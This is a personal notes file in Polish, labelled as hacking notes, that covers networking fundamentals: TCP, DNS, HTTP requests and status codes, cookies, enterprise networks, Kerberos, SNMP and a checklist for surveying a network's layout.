# my-all-notes
it is my all notes about almost every hacking topics I've been learned in 3 years


# Podstawy

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Twój laptop zawiera kartę sieciową (NIC) , która umożliwia mu łączenie 
się z routerami Wi-Fi. Ta karta ma unikalny adres, zwany adresem MAC, 
który identyfikuje urządzenie w sieci. Gdy router chce wysłać informacje 
o komputerze, oznacza ten pakiet adresem MAC laptopa, a następnie 
nadaje go jako sygnał radiowy. Wszystkie maszyny podłączone do tego 
routera odbierają ten sygnał radiowy i sprawdzają adres MAC pakietu


Klient inicjuje połączenie TCP, wysyłając serwerowi SYN
pakiet, który jest pakietem TCP z flagą SYN ustawioną na true. Ten 
pakiet SYN zawiera również początkowy numer sekwencyjny klienta. 
Na przykład wysłanie pakietu SYN(3) jest jak powiedzenie „Cześć, mój 
początkowy numer sekwencyjny to 3. Jaki jest twój?” Gdy serwer 
otrzyma pakiet SYN, rejestruje numer sekwencyjny klienta i odpowiada, 
wysyłając pakiet SYN-ACK, który ma obie flagi SYN i ACK ustawione na 
true. Ten pakiet SYN-ACK potwierdza otrzymanie numeru sekwencyjnego 
klienta i wysyła numer sekwencyjny serwera.
Na przykład pakiet SYN(0) ACK(4) jest odpowiednikiem powiedzenia 
„Mój początkowy numer sekwencyjny to 0 i oczekuję, że wyślesz 
następny pakiet 4.”. Jednak połączenie nie jest nawiązywane, dopóki 
serwer nie otrzyma pakietu ACK z powiadomieniem, że klient 
otrzymał swój numer sekwencji i oczekuje następnej wartości w sekwencji.
Gdy systemy zakończą wymianę pakietów, zamykają się
połączenie poprzez wymianę pakietów FIN i ACK.

MULTICASTDNS (MDNS) - 
W sieciach komputerowych protokół DNS multiemisji rozwiązuje nazwy hostów na adresy IP w małych sieciach, które nie zawierają lokalnego serwera nazw.

NEL . Nagłówek odpowiedzi HTTP NEL jest używany do konfigurowania rejestrowania żądań sieciowych. Typ nagłówka . Nagłówek odpowiedzi . Zabroniona nazwa nagłówka .

DNS (Domain Name System) zapewnia nam prosty sposób komunikowania się z urządzeniami w Internecie bez zapamiętywania liczb złożonych. Podobnie jak każdy dom ma unikalny adres do wysyłania poczty bezpośrednio do niego, każdy komputer w Internecie ma swój własny unikalny adres do komunikacji z nim, zwany adresem IP. Adres IP wygląda następująco 104.26.10.229 , 4 zestawy cyfr z zakresu od 0 do 255 oddzielone kropką. Kiedy chcesz odwiedzić stronę internetową, pamiętanie tego skomplikowanego zestawu liczb nie jest zbyt wygodne i właśnie w tym może pomóc DNS . Więc zamiast pamiętać 104.26.10.229, możesz zamiast tego pamiętać tryhackme.com.

DNS nie jest jednak przeznaczony tylko dla stron internetowych i istnieje wiele typów rekordów DNS. Omówimy niektóre z najczęstszych, z którymi możesz się spotkać.

A Record

Te rekordy są tłumaczone na adresy IPv4, na przykład 104.26.10.229

Rekord AAAA

Rekordy te są tłumaczone na adresy IPv6, na przykład 2606:4700:20::681a:be5

Rekord CNAME

Rekordy te są tłumaczone na inną nazwę domeny, na przykład sklep internetowy TryHackMe ma nazwę subdomeny store.tryhackme.com, która zwraca rekord CNAME shopify.com. Następnie zostanie wysłane kolejne żądanie DNS do shopify.com w celu ustalenia adresu IP.

Rekord MX

Rekordy te są rozpoznawane jako adresy serwerów obsługujących pocztę e-mail dla domeny, której dotyczy zapytanie, na przykład odpowiedź rekordu MX dla tryhackme.com wyglądałaby mniej więcej tak: alt1.aspmx.l.google.com . Te rekordy są również opatrzone flagą priorytetu. To mówi klientowi, w jakiej kolejności wypróbować serwery, jest to idealne rozwiązanie, gdy główny serwer ulegnie awarii i e-mail musi zostać wysłany na serwer zapasowy.

Rekord TXT

Rekordy TXT to pola tekstowe, w których można przechowywać dowolne dane tekstowe. Rekordy TXT mają wiele zastosowań, ale niektóre z nich to najczęściej wymieniane serwery, które mają uprawnienia do wysyłania wiadomości e-mail w imieniu domeny (może to pomóc w walce ze spamem i sfałszowaną wiadomością e-mail). Mogą być również używane do weryfikacji własności nazwy domeny podczas rejestracji w usługach stron trzecich.

Gdy żądasz nazwy domeny, komputer najpierw sprawdza swoją lokalną pamięć podręczną, aby sprawdzić, czy ostatnio wyszukiwałeś adres; jeśli nie, zostanie wysłane żądanie do Twojego Rekursywnego Serwera DNS .

Rekursywny serwer DNS jest zwykle dostarczany przez dostawcę usług internetowych, ale możesz również wybrać własny. Ten serwer ma również lokalną pamięć podręczną ostatnio wyszukanych nazw domen. Jeśli wynik zostanie znaleziony lokalnie, zostanie on odesłany z powrotem do Twojego komputera, a Twoje żądanie kończy się tutaj (jest to powszechne w przypadku popularnych i często poszukiwanych usług, takich jak Google, Facebook, Twitter). Jeśli żądanie nie może zostać znalezione lokalnie, podróż rozpoczyna się od znalezienia prawidłowej odpowiedzi, zaczynając od głównych serwerów DNS Internetu.

Serwery główne działają jako szkielet DNS Internetu; ich zadaniem jest przekierowanie Cię do właściwego Serwera Domeny Najwyższego Poziomu, w zależności od Twojego żądania. Jeśli, na przykład, zażądasz www.tryhackme.com , serwer główny rozpozna domenę najwyższego poziomu .com i skieruje Cię do właściwego serwera TLD, który zajmuje się adresami .com.

Serwer TLD przechowuje rekordy określające, gdzie znaleźć autorytatywny serwer, który odpowie na żądanie DNS . Serwer autorytatywny jest często nazywany także serwerem nazw domeny. Na przykład serwer nazw dla tryhackme.com to kip.ns.cloudflare.com i uma.ns.cloudflare.com . Często można znaleźć wiele serwerów nazw, aby nazwa domeny działała jako kopia zapasowa na wypadek awarii jednego z nich.

Autorytatywny serwer DNS to serwer, który jest odpowiedzialny za przechowywanie rekordów DNS dla określonej nazwy domeny i na którym będą dokonywane wszelkie aktualizacje rekordów DNS nazwy domeny. W zależności od typu rekordu, rekord DNS jest następnie odsyłany do rekursywnego serwera DNS, gdzie lokalna kopia będzie buforowana dla przyszłych żądań, a następnie przekazywana z powrotem do oryginalnego klienta, który wysłał żądanie. Wszystkie rekordy DNS mają wartość TTL (Time To Live). Ta wartość to liczba wyrażona w sekundach, dla której odpowiedź powinna zostać zapisana lokalnie, dopóki nie będziesz musiał jej ponownie wyszukać. Buforowanie pozwala zaoszczędzić na konieczności wykonywania żądania DNS za każdym razem, gdy komunikujesz się z serwerem.

Co to jest HTTP? (Protokół przesyłania hipertekstu)

Gdy uzyskujemy dostęp do strony internetowej, Twoja przeglądarka będzie musiała wysyłać żądania do serwera internetowego o zasoby, takie jak HTML, obrazy, i pobierać odpowiedzi. Wcześniej musisz dokładnie powiedzieć przeglądarce, jak i gdzie uzyskać dostęp do tych zasobów, tutaj pomogą adresy URL.

Co to jest adres URL? (jednolity lokalizator zasobów)

Jeśli korzystałeś z internetu, wcześniej używałeś adresu URL. Adres URL to przede wszystkim instrukcja, jak uzyskać dostęp do zasobu w Internecie. Poniższy obrazek pokazuje, jak wygląda adres URL ze wszystkimi jego funkcjami (nie używa wszystkich funkcji w każdym żądaniu).

![a7b0f3884a710a4713cf9f5807a59357.png](:/171a8b0e1da24703824777f2b5175a46)

Schemat: Instruuje jakiego protokołu użyć do uzyskania dostępu do zasobu, takiego jak HTTP , HTTPS, FTP (protokół przesyłania plików).

Użytkownik: Niektóre usługi wymagają uwierzytelnienia, aby się zalogować, możesz umieścić nazwę użytkownika i hasło w adresie URL, aby się zalogować.

Host: nazwa domeny lub adres IP serwera, do którego chcesz uzyskać dostęp.

Port: Port, z którym będziesz się łączyć, zwykle 80 dla HTTP i 443 dla HTTPS, ale może być hostowany na dowolnym porcie od 1 do 65535.

Ścieżka: nazwa pliku lub lokalizacja zasobu, do którego próbujesz uzyskać dostęp.

Ciąg zapytania: dodatkowe bity informacji, które można wysłać na żądaną ścieżkę. Na przykład /blog? id=1 poinformuje ścieżkę bloga, że ​​chcesz otrzymywać artykuł na blogu o identyfikatorze 1.

Fragment: jest to odniesienie do lokalizacji na żądanej stronie. Jest to powszechnie stosowane w przypadku stron o długiej treści i może mieć bezpośrednio połączoną określoną część strony, dzięki czemu jest ona widoczna dla użytkownika, gdy tylko uzyska dostęp do strony.

Składam prośbę

Możliwe jest wysłanie żądania do serwera WWW za pomocą tylko jednej linii " GET / HTTP/1.1 "

![30ecc65c624994d1798bb5711089cb1b.png](:/88d1f3a691b6495fb4ee7f799f3ed569)

Ale aby uzyskać znacznie bogatsze wrażenia w sieci, musisz również wysłać inne dane. Te inne dane są wysyłane w tak zwanych nagłówkach, gdzie nagłówki zawierają dodatkowe informacje, które należy przekazać serwerowi internetowemu, z którym się komunikujesz, ale zajmiemy się tym dokładniej w zadaniu Nagłówek.

Przykładowe żądanie:
**GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/**

Linia 1: To żądanie wysyła metodę GET (więcej na ten temat w zadaniu Metody HTTP ), żąda strony głównej za pomocą / i informuje serwer WWW, że używamy protokołu HTTP w wersji 1.1.

Linia 2: Mówimy serwerowi WWW, że chcemy mieć stronę tryhackme.com

Linia 3: Mówimy serwerowi WWW, że używamy przeglądarki Firefox w wersji 87

Linia 4: Informujemy serwer sieciowy, że strona, która nas do niej skierowała, to https://tryhackme.com

Wiersz 5: Żądania HTTP zawsze kończą się pustą linią informującą serwer WWW, że żądanie zostało zakończone.

Przykładowa odpowiedź:


```
HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 09 Apr 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

<html>
<head>
    <title>TryHackMe</title>
</head>
<body>
    Welcome To TryHackMe.com
</body>
</html>
```
Aby podzielić każdy wiersz odpowiedzi:

Wiersz 1: HTTP 1.1 to wersja protokołu HTTP używanego przez serwer, po której następuje w tym przypadku kod stanu HTTP „200 Ok”, który informuje nas, że żądanie zostało zakończone pomyślnie.

Linia 2: zawiera informacje o oprogramowaniu serwera WWW i numerze wersji.

Linia 3: aktualna data, godzina i strefa czasowa serwera WWW.

Linia 4: Nagłówek Content-Type mówi klientowi, jakiego rodzaju informacje zostaną wysłane, takie jak HTML, obrazy, filmy, pdf, XML .

Linia 5: Content-Length informuje klienta o długości odpowiedzi, dzięki czemu możemy potwierdzić, że nie brakuje danych.

Wiersz 6: Odpowiedź HTTP zawiera pustą linię, aby potwierdzić koniec odpowiedzi HTTP.

Wiersze 7-14: Żądane informacje, w tym przypadku strona główna.


Metody HTTP umożliwiają klientowi pokazanie zamierzonej akcji podczas wykonywania żądania HTTP. Istnieje wiele metod HTTP, ale omówimy te najczęstsze, chociaż najczęściej będziesz miał do czynienia z metodą GET i POST.

POBIERZ ŻĄDANIE (GET REQUEST)

Służy do pobierania informacji z serwera WWW.

Żądanie POST (POST REQUEST)

Służy do przesyłania danych na serwer WWW i potencjalnego tworzenia nowych rekordów

Żądanie PUT (PUT REQUEST)

Służy do przesyłania danych na serwer sieciowy w celu aktualizacji informacji

USUŃ żądanie (DELETE REQUEST)

Służy do usuwania informacji/rekordów z serwera WWW.

Kody stanu HTTP :
W poprzednim zadaniu dowiedziałeś się, że gdy serwer HTTP odpowiada, pierwsza linia zawsze zawiera kod statusu informujący klienta o wyniku jego żądania, a także potencjalnie o tym, jak go obsłużyć. Te kody stanu można podzielić na 5 różnych zakresów:

```
100-199 - Odpowiedź informacyjna	Są one wysyłane, aby poinformować klienta, że ​​pierwsza część jego prośby została zaakceptowana i powinien kontynuować wysyłanie reszty prośby. Te kody nie są już bardzo powszechne.
200-299 - Sukces	Ten zakres kodów stanu służy do informowania klienta, że ​​jego żądanie zakończyło się powodzeniem.
300-399 — Przekierowanie	Służą one do przekierowania żądania klienta do innego zasobu. Może to dotyczyć innej strony internetowej lub zupełnie innej witryny.
400-499 — Błędy klienta	Służy do informowania klienta, że ​​wystąpił błąd w jego żądaniu.
500-599 — Błędy serwera	Jest to zarezerwowane dla błędów występujących po stronie serwera i zwykle wskazuje na dość poważny problem z obsługą żądania przez serwer.
```
Typowe kody stanu HTTP :

Istnieje wiele różnych kodów stanu HTTP i nie obejmuje to faktu, że aplikacje mogą nawet definiować własne, omówimy najczęstsze odpowiedzi HTTP, z którymi możesz się spotkać:


```
200 - OK	Żądanie zostało pomyślnie zrealizowane.
201 - Utworzono	Utworzono zasób (na przykład nowy użytkownik lub nowy wpis na blogu).
301 — Stałe przekierowanie	Przekierowuje to przeglądarkę klienta na nową stronę internetową lub informuje wyszukiwarki, że strona została przeniesiona w inne miejsce i zamiast tego szukała.
302 — Tymczasowe przekierowanie	Podobny do powyższego stałego przekierowania, ale jak sama nazwa wskazuje, jest to tylko tymczasowa zmiana i może zmienić się ponownie w najbliższej przyszłości.
400 — Zła prośba	To informuje przeglądarkę, że coś było nie tak lub czegoś brakuje w jej żądaniu. Może to być czasami używane, jeśli żądany zasób serwera WWW oczekiwał określonego parametru, którego klient nie wysłał.
401 — Brak autoryzacji	Obecnie nie możesz przeglądać tego zasobu, dopóki nie dokonasz autoryzacji w aplikacji internetowej, najczęściej przy użyciu nazwy użytkownika i hasła.
403 - Zabronione	Nie masz uprawnień do wyświetlania tego zasobu, niezależnie od tego, czy jesteś zalogowany, czy nie.
405 — Niedozwolona metoda	Zasób nie zezwala na to żądanie metody, na przykład wysyłasz żądanie GET do zasobu /create-account, gdy zamiast tego oczekiwał żądania POST.
404 — Nie znaleziono strony	Żądana strona/zasób nie istnieje.
500 — Wewnętrzny błąd usługi	Serwer napotkał jakiś błąd w twoim żądaniu, który nie wie, jak poprawnie obsłużyć.
503 Usługa niedostępna
``` 
Ten serwer nie może obsłużyć Twojego żądania, ponieważ jest przeciążony lub wyłączony z powodu konserwacji.


Nagłówki to dodatkowe bity danych, które możesz wysłać do serwera WWW podczas wysyłania żądań.

Chociaż żadne nagłówki nie są bezwzględnie wymagane przy wysyłaniu żądania HTTP , trudno będzie prawidłowo wyświetlić witrynę.

Wspólne nagłówki żądań
﻿Są to nagłówki, które są wysyłane od klienta (zazwyczaj przeglądarki) do serwera.

Host: Niektóre serwery internetowe obsługują wiele witryn internetowych, więc dostarczając nagłówki hosta, możesz określić, którego z nich potrzebujesz, w przeciwnym razie otrzymasz domyślną witrynę internetową dla serwera.

User-Agent: To jest oprogramowanie przeglądarki i numer wersji, informujący serwer sieciowy, że oprogramowanie przeglądarki pomaga w prawidłowym sformatowaniu witryny dla Twojej przeglądarki, a niektóre elementy HTML, JavaScript i CSS są dostępne tylko w niektórych przeglądarkach.

Content-Length Podczas wysyłania danych do serwera WWW, na przykład w formularzu, długość treści informuje serwer WWW, ile danych ma oczekiwać w żądaniu WWW. W ten sposób serwer może zapewnić, że nie brakuje żadnych danych.

Accept-Encoding: Informuje serwer sieciowy, jakie rodzaje metod kompresji obsługuje przeglądarka, dzięki czemu dane mogą być mniejsze do przesyłania przez Internet.

Cookie: Dane wysyłane do serwera, aby pomóc zapamiętać Twoje informacje (zobacz zadanie plików cookie, aby uzyskać więcej informacji).

Wspólne nagłówki odpowiedzi
Są to nagłówki zwracane klientowi z serwera po żądaniu.

Set-Cookie: Informacje do przechowywania, które są wysyłane z powrotem do serwera WWW przy każdym żądaniu (zobacz zadanie cookies, aby uzyskać więcej informacji).

Cache-Control:ak długo przechowywać zawartość odpowiedzi w pamięci podręcznej przeglądarki, zanim ponownie zażąda jej.

Content-Type: Informuje klienta, jaki typ danych jest zwracany, tj. HTML, CSS, JavaScript, Obrazy, PDF, Wideo itp. Używając nagłówka content-type przeglądarka wie, jak przetwarzać dane.

Content-Encoding: Jaka metoda została użyta do skompresowania danych, aby zmniejszyć je podczas wysyłania ich przez Internet

Prawdopodobnie słyszałeś już o plikach cookie, to tylko niewielki fragment danych przechowywanych na Twoim komputerze. Pliki cookie są zapisywane po otrzymaniu nagłówka „Set-Cookie” z serwera internetowego. Następnie przy każdym kolejnym żądaniu wyślesz dane z plików cookie z powrotem na serwer sieciowy. Ponieważ protokół HTTP jest bezstanowy (nie śledzi twoich poprzednich żądań), pliki cookie mogą być używane do przypominania serwerowi WWW, kim jesteś, niektórych osobistych ustawień witryny lub czy byłeś na niej wcześniej. Przyjrzyjmy się temu jako przykładowemu żądaniu HTTP:

![3ef88e362cc8b52ffe1980d6ccf4dcf0.png](:/35676de54c9241488a52a289147eee8d)
Pliki cookie mogą być wykorzystywane do wielu celów, ale najczęściej są używane do uwierzytelniania witryn internetowych. Wartość pliku cookie zwykle nie będzie ciągiem zwykłego tekstu, w którym można zobaczyć hasło, ale tokenem (unikalny tajny kod, który nie jest łatwy do odgadnięcia przez człowieka).

Przeglądanie plików cookie

Możesz łatwo sprawdzić, jakie pliki cookie Twoja przeglądarka wysyła do witryny, korzystając z narzędzi programistycznych w przeglądarce. Jeśli nie masz pewności, jak uzyskać dostęp do narzędzi programistycznych w przeglądarce, kliknij przycisk „Wyświetl witrynę” u góry tego zadania, aby uzyskać przewodnik.

Po otwarciu narzędzi programistycznych kliknij kartę „Sieć”. Ta karta pokaże Ci listę wszystkich zasobów, których zażądała Twoja przeglądarka. Możesz kliknąć na każdy z nich, aby otrzymać szczegółowe zestawienie prośby i odpowiedzi. Jeśli Twoja przeglądarka wysłała plik cookie, zobaczysz je na karcie „Cookies” żądania.

Najpierw przyjrzyjmy się, jak hasła są przechowywane na twoim komputerze lub dowolnym serwerze.
Gdy wprowadzasz hasło do konta, hasło nie jest zapisywane w surowym formacie. Konwertuje hashing algorithmsurowe hasło na ciąg znaków (hash), którego dekodowanie zajęłoby dużo czasu i zasobów.

Sieć rozległa (WAN)
Sieć WAN rozciąga się na dużym obszarze geograficznym i łączy indywidualnych użytkowników lub wiele sieci LAN. Internet można uznać za sieć WAN. Duże organizacje wykorzystują sieci WAN do łączenia różnych lokalizacji, zdalnych pracowników, dostawców i centrów danych, dzięki czemu mogą uruchamiać aplikacje i uzyskiwać dostęp do niezbędnych danych.

Fizyczną łączność w sieciach WAN można uzyskać za pomocą linii dzierżawionych, połączeń komórkowych, łączy satelitarnych i innych środków.

Sieć firmowa
Sieć zbudowana dla dużej organizacji, zwykle nazywanej przedsiębiorstwem, musi spełniać rygorystyczne wymagania. Ponieważ sieć ma kluczowe znaczenie dla funkcjonowania każdego nowoczesnego przedsiębiorstwa, sieci korporacyjne muszą być wysoce dostępne, skalowalne i niezawodne. Sieci te mają narzędzia, które umożliwiają inżynierom i operatorom sieci projektowanie, wdrażanie, debugowanie i korygowanie ich.

Przedsiębiorstwo może korzystać zarówno z sieci LAN, jak i WAN w swoim kampusie, oddziałach i centrach danych.

Sieć dostawców usług
Dostawcy usług obsługują sieci WAN w celu zapewnienia łączności indywidualnym użytkownikom lub organizacjom. Mogą oferować przedsiębiorstwom prostą łączność w postaci łączy dzierżawionych lub bardziej zaawansowane usługi zarządzane. Dostawcy usług zapewniają również swoim klientom łączność internetową i komórkową.

Z czego składa się sieć korporacyjna?
Chociaż sieć przedsiębiorstwa musi dostarczać kompleksowe usługi użytkownikom, rzeczom i aplikacjom, może składać się z oddzielnych, ale połączonych domen składowych. Zazwyczaj każda sieć składowa jest projektowana, udostępniana i optymalizowana pod kątem własnego celu i celów biznesowych. Składowe typy sieci obejmują:

Kampus, oddział i Internet rzeczy (IoT): sieci te zapewniają stały i mobilny dostęp do użytkowników i rzeczy. Są obecne we wszystkich obszarach organizacji, zarówno w biurach, jak i w przestrzeniach operacyjnych, takich jak hale produkcyjne i magazynowe. Sieci te są zoptymalizowane pod kątem przejrzystego, bezpiecznego dostępu i wysokiej gęstości.
Centra danych i chmury hybrydowe: sieci te łączą się z aplikacjami, obciążeniami i danymi oraz między nimi w lokalnych centrach danych oraz prywatnych i publicznych usługach chmurowych. Są zoptymalizowane pod kątem małych opóźnień, bezpieczeństwa i niezawodności o znaczeniu krytycznym.
Sieci rozległe (WAN): Sieci te łączą obiekty, budynki lub kampusy z innymi oddziałami, centrami danych lub zasobami w chmurze. Są zoptymalizowane pod kątem wygody użytkownika i wydajności przepustowości.
Jak rozwijają się sieci korporacyjne?
Zapewnienie podstaw dla nowoczesnego przedsiębiorstwa cyfrowego: coraz częściej oczekuje się, że sieci poprawią bezpieczeństwo, poprawią komfort użytkowania i będą obsługiwać wiele urządzeń wykonujących podstawowe zadania biznesowe. Dobrze zaprojektowane sieci korporacyjne obsługują różnych użytkowników, urządzenia, inteligentne rzeczy i aplikacje, zapewniając spójną, gwarantowaną usługę.
Korzystanie z kontrolerów sieciowych: Jako centra dowodzenia i kontroli nowoczesnych sieci korporacyjnych, kontrolery koordynują wszystkie funkcje sieci. Wykonują takie zadania, jak przekładanie celów biznesowych na zasady, automatyzacja operacji na urządzeniach sieciowych, monitorowanie wydajności i rozwiązywanie problemów.
Rozszerzający się zakres: Wraz ze wzrostem liczby transakcji sieciowych rozpoczynających się lub kończących poza tradycyjnymi granicami korporacyjnymi — ze względu na trendy, takie jak ekspansja do wielu chmur publicznych, mobilność i praca z domu — sieć musi zwiększyć widoczność, kontrolę i bezpieczeństwo wszędzie tam, gdzie znajdują się użytkownicy, rzeczy i aplikacje.
Integracja w całym przedsiębiorstwie: Przedsiębiorstwa przyjmują obecnie holistyczną, otwartą strategię sieciową, która integruje się w składowych domenach sieciowych oraz z aplikacjami i systemami informatycznymi. Takie integracje zapewniają stałą wydajność, usprawnione operacje, lepszą zgodność i egzekwowanie bezpieczeństwa w całej organizacji.

Kerberos to protokół uwierzytelniania sieciowego Umożliwia węzłom bezpieczniejszą komunikację za pośrednictwem niezabezpieczonych sieci, takich jak większość protokołów internetowych, takich jak HTTP i FTP.

Działa przy użyciu biletów do uwierzytelniania autoryzowanych klientów na autoryzowanych serwerach i odwrotnie – łagodząc w ten sposób ataki typu man-in-the-middle i odpowiedzi. Zarówno klient , jak i serwer uwierzytelniają się wzajemnie pakietami wysyłanymi za pośrednictwem protokołu Kerberos, zwykle przeznaczonego na port UDP 88.

![ef762a5d6c6a395549fbaa865918b7c1.png](:/88cbd1b6f6d745e7b1a41c96f28c6605)

Webmin, internetowe narzędzie do konfiguracji systemu

https://www.onlineocr.net/pl/

HTTP: https://www.tutorialspoint.com/http/http_requests.htm

|-------------------SCSP/SFTP:---------------------|
Protokoły te są zwykle stosowane w celu przesyłania plików z lokalnego komputera do serwera lub między dwoma zdalnymi serwerami. SCP to protokół kopiowania plików, który wykorzystuje bezpieczne połączenie SSH, a SFTP to protokół transferu plików, który również korzysta z połączenia SSH.
|---------------------/|\-------------------------|


Wszystkie punkty dostępu hosta w sieci: Aby uzyskać listę wszystkich punktów dostępu hosta w sieci, można skorzystać z poleceń systemowych, takich jak ipconfig (w systemach Windows) lub ifconfig (w systemach Unix/Linux), aby wyświetlić informacje o wszystkich aktywnych interfejsach sieciowych na danym hoście.

Typy interfejsów dostępowych: Typy interfejsów dostępnych w urządzeniu mogą obejmować Ethernet (e), Fast-Ethernet (fe), Gigabit-Ethernet (ge), Universal Serial Bus (USB), Console (con), Loop-back (lo), Wi-Fi (w) itp. Każdy z tych interfejsów ma swoje unikalne cechy i prędkości transmisji danych. Na przykład, Ethernet jest szeroko stosowanym standardem w sieciach przewodowych, a Wi-Fi umożliwia bezprzewodowe połączenie.

Filtracja adresów MAC i NAC: Filtrowanie adresów MAC i NAC jest metodą kontroli dostępu, która pozwala na zezwolenie lub blokowanie urządzeń na podstawie ich adresów MAC lub innych kryteriów. Filtracja MAC polega na ustalaniu listy dozwolonych lub zabronionych adresów MAC, które mogą mieć dostęp do sieci. NAC (Network Access Control) to szeroki termin obejmujący różne techniki i narzędzia kontroli dostępu w sieciach. Celem NAC jest zapewnienie bezpiecznego i kontrolowanego dostępu do sieci na podstawie różnych czynników, takich jak uwierzytelnianie użytkownika, status zabezpieczeń urządzenia itp.

Dostęp do konsoli zdalnej i lokalnej: Dostęp do konsoli zdalnej lub lokalnej może być włączony lub zablokowany w zależności od konfiguracji urządzenia. Dostęp do konsoli zdalnej umożliwia zarządzanie urządzeniem z dowolnego miejsca w sieci, podczas gdy dostęp do konsoli lokalnej wymaga fizycznego dostępu do urządzenia. Zarówno dostęp zdalny, jak i lokalny mogą być kontrolowane za pomocą odpowiednich ustawień zabezpieczeń, takich jak hasła dostępu i listy dozwolonych adresów IP.

Zabezpieczenia fizyczne: Zabezpieczenia fizyczne w sieci mogą obejmować zamknięte pomieszczenia z serwerami, szafami serwerowymi lub blokadami USB. Zamknięte pomieszczenia i szafy serwerowe zapewniają kontrolę dostępu tylko dla uprawnionych osób. Blokady USB mogą być stosowane w celu zapobieżenia podłączeniu nieautoryzowanych urządzeń do komputerów.

Dziennik dostępu do interfejsu: Dziennik dostępu do interfejsu to narzędzie rejestrujące wszelkie próby dostępu do interfejsów sieciowych. Może zawierać informacje takie jak adres IP źródłowego hosta, data i godzina dostępu, wynik operacji (pomyślny/nieudany) itp.

Adresy IP i adresy MAC punktów dostępowych: Aby poznać adresy IP i adresy MAC punktów dostępowych w sieci, można skorzystać z narzędzi takich jak arp, ipconfig, ifconfig, show ip interface brief itp., w zależności od systemu operacyjnego i typu urządzenia sieciowego. Te narzędzia dostarczą informacje o adresach IP i adresach MAC przypisanych do poszczególnych interfejsów sieciowych.

Dostawcy usług internetowych (ISP): Liczba dostawców usług internetowych (ISP), którzy obsługują serwer, może być jednym lub więcej. To zależy od konkretnego środowiska i konfiguracji sieciowej.

Typ połączenia internetowego: Przepustowość łącza internetowego oraz rodzaj medium transmisyjnego (na przykład światłowód Ethernet, kabel koncentryczny itp.) zależą od konfiguracji sieciowej i dostawcy usług internetowych.

Przejścia do sieci: Przejścia do sieci, takie jak routery, przełączniki itp., mogą być wykorzystywane w celu połączenia różnych sieci lub segmentów sieci. Przejścia mogą mieć różne cechy i funkcje, takie jak routowanie pakietów, filtrowanie ruchu, zarządzanie pasmem, itp. Ostateczna konfiguracja przejść zależy od struktury i wymagań sieciowych.

Bramy graniczne, przejścia i punkty wyjścia:

Serwer może mieć jednego lub więcej dostawców usług internetowych (ISP), w zależności od konfiguracji.
Korzystanie z zaufanego połączenia internetowego (TIC) lub zarządzanej usługi internetowej (MIS) zależy od potrzeb i wymagań użytkownika.
Przepustowość łącza internetowego również zależy od wymagań i potrzeb użytkownika.
Przejścia prowadzące do sieci mogą różnić się w zależności od konfiguracji, mogą to być światłowody, kable koncentryczne lub inne kanały.
Istnieją różne sposoby na wejście lub wyjście z sieci, w tym satelita, kuchenka mikrofalowa, laser lub Wi-Fi.
Struktura i schemat sieci:

Nazwa, cel i rozmiar każdej podsieci, na przykład bezklasowy routing między domenami (CIDR), zależy od konfiguracji sieci.
Wirtualne sieci lokalne (VLAN) mogą być włączone lub wyłączone w zależności od potrzeb i wymagań użytkownika.
Limity puli połączeń również zależą od wymagań i potrzeb użytkownika.
Sieć może być płaska, hierarchiczna lub podzielona na struktury, warstwy ochronne i/lub funkcje.
Hosty i węzły sieciowe:

Nazwa i wersja systemu operacyjnego (OS) hostów i węzłów sieciowych zależy od konfiguracji sieci.
Usługi/porty używane na hostach i węzłach sieciowych, które są otwarte, zależą od konfiguracji sieci.
Narzędzia bezpieczeństwa zainstalowane na hostach i węzłach sieciowych, które pozwalają wykryć ataki, również zależą od konfiguracji sieci.
Wspólne luki w zabezpieczeniach (CVE) mogą występować w zależności od konfiguracji sieci.
Sieć fizyczna i logiczna oraz architektura budynku:

Centrum danych może znajdować się w różnych miejscach, w zależności od konfiguracji sieci.
Gniazda Ethernet w holu lub innym miejscu w budynku mogą być zainstalowane w zależności od potrzeb i wymagań użytkownika.
Dostępność wifi na zewnątrz budynku zależy od konfiguracji sieci.
Widoczność ekranów komputerów i terminali z zewnątrz budynku zależy od konfiguracji sieci i stosowanych zabezpieczeń.
Użycie szkła bezpiecznego w biurze również zależy od konfiguracji sieci i wymagań użytkownika.
Sieci dla gości lub sal konferencyjnych mogą być odpowiednio podzielone na segmenty w zależności od konfiguracji sieci.
Główne listy kontroli dostępu (ACL) i reguły zapory w sieci zależą od konfiguracji sieci.
Lokalizacja rozpoznawanego DNS zależy od konfiguracji sieci.
Obrzeża sieci lub strefa zdemilitaryzowana (DMZ) mogą mieć różne funkcje i usługi, w zależności od konfiguracji sieci.
Istnienie zewnętrznych dostawców poczty e-mail lub innych usług w chmurze zależy od konfiguracji sieci.
Architektura dostępu zdalnego lub wirtualnej sieci prywatnej (VPN) również zależy od konfiguracji sieci.


Działąnie Nmapa:  Nmap [24], który skanuje sieć w celu 
określenia znajdujących się w niej hostów, wizualizuje sieć na podstawie liczby przeskoków ze skanera, wykorzystuje Prosty protokół zarządzania siecią (SNMP) do wykrywania i wyświetlania topologii sieci lub korzystania z routera i przełączaj pliki konfiguracyjne, aby szybko generować diagramy sieciowe.

A Sieć SNMP (Simple Network Management Protocol) to protokół stosowany w zarządzaniu siecią komputerową. Jest on powszechnie używany do monitorowania i zarządzania urządzeniami sieciowymi, takimi jak routery, przełączniki, serwery, drukarki itp. Protokół SNMP umożliwia zbieranie informacji o stanie urządzeń, wykrywanie błędów, monitorowanie parametrów sieciowych, konfigurację urządzeń oraz zdalne zarządzanie nimi.

Główne elementy sieci SNMP to:

Zarządca (Manager): To urządzenie lub oprogramowanie, które zbiera informacje od urządzeń zarządzanych, wykonuje zapytania SNMP, monitoruje działanie sieci i podejmuje odpowiednie działania w zależności od otrzymanych danych.
Urządzenie zarządzane (Managed Device): To urządzenie sieciowe, które jest monitorowane i zarządzane za pomocą protokołu SNMP. Może to być router, przełącznik, serwer, drukarka itp.
Agenty (Agents): Są to aplikacje lub moduły zainstalowane na urządzeniach zarządzanych, które zbierają informacje o stanie urządzenia i udostępniają je zarządcy za pomocą protokołu SNMP. Agenty reagują na żądania zarządcy i przekazują informacje o stanie urządzenia.
Sieć SNMP składa się z zestawu zdefiniowanych obiektów zarządzanych (Management Information Base - MIB), które reprezentują różne parametry i właściwości urządzeń sieciowych. Zarządca może odpytywać agenty za pomocą zapytań SNMP, a agenci przesyłają odpowiedzi z informacjami o stanie urządzeń.

